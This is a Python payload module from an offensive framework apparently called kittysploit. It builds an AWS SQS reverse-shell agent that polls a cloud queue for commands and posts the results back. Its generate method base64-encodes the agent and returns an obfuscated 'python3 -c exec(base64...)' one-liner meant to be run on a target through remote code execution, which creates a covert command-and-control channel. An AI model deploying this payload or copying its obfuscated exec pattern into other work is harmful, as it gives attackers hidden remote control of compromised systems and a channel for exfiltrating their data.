from kittysploit import *
import base64

from lib.c2.aws_sqs_reverse_agent import build_aws_sqs_reverse_agent_script


class Module(Payload):
	"""AWS SQS reverse shell agent — deliverable via RCE like HTTP/MQTT polling."""

	CLIENT_LANGUAGE = "python"

	__info__ = {
		"name": "Python AWS SQS Reverse Shell",
		"description": (
			"Poll an SQS command queue for tasks and publish results to a response queue. "
			"Uses boto3 when available, otherwise falls back to aws CLI. "
			"Pairs with listeners/aws/reverse_aws_sqs."
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.PYTHON,
		"platform": Platform.MULTI,
		"listener": "listeners/aws/reverse_aws_sqs",
		"handler": Handler.REVERSE,
		"session_type": SessionType.AWS,
	}

	command_queue_url = OptString("", "SQS command queue URL (REQUIRED)", True)
	response_queue_url = OptString("", "SQS response queue URL (REQUIRED)", True)
	aws_region = OptString("us-east-1", "AWS region", False)
	aws_access_key_id = OptString("", "AWS access key ID (optional)", False)
	aws_secret_access_key = OptString("", "AWS secret access key (optional)", False)
	aws_session_token = OptString("", "AWS session token (optional)", False)
	poll_interval = OptInteger(2, "Poll interval seconds", False)
	use_base64 = OptBool(True, "Base64-encode SQS message bodies", False)
	python_binary = OptString("python3", "Python on target", True)

	def generate(self):
		cmd_url = str(getattr(getattr(self, "command_queue_url", None), "value", self.command_queue_url) or "").strip()
		res_url = str(getattr(getattr(self, "response_queue_url", None), "value", self.response_queue_url) or "").strip()
		if not cmd_url or not res_url:
			raise ValueError("command_queue_url and response_queue_url are required")

		script = build_aws_sqs_reverse_agent_script(
			cmd_url,
			res_url,
			aws_region=str(self.aws_region or "us-east-1"),
			aws_access_key_id=str(self.aws_access_key_id or ""),
			aws_secret_access_key=str(self.aws_secret_access_key or ""),
			aws_session_token=str(self.aws_session_token or ""),
			poll_interval=float(getattr(getattr(self, "poll_interval", None), "value", self.poll_interval) or 2),
			use_base64=bool(getattr(getattr(self, "use_base64", None), "value", self.use_base64)),
		)
		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
		py = str(self.python_binary)
		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
